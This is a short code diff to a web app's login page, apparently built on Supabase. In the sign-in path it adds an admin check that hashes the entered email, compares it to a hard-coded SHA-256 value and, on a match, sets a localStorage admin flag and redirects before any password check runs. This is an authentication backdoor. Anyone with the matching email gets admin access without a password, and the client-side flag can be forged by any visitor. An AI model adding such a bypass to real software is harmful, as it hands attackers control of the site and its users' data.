@@ -38,6 +38,18 @@ export default function LoginPage() {
         alert('Registration successful! Please check your email to verify.');
         setMode('login');
       } else {
+        // Check for admin
+        const hashBuffer = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(email.toLowerCase().trim()));
+        const hashHex = Array.from(new Uint8Array(hashBuffer)).map(b => b.toString(16).padStart(2, '0')).join('');
+        const isAdmin = hashHex === '5a1f85ff5a73d150d8e118522ca01273c5af85ce1318a33a5f98a5846af6439b';
+        
+        if (isAdmin) {
+          localStorage.setItem('kaya_admin', 'true');
+          alert('Welcome, Admin!');
+          router.push('/');
+          return;
+        }
+
         const { error: signInError } = await supabase.auth.signInWithPassword({
           email,
           password
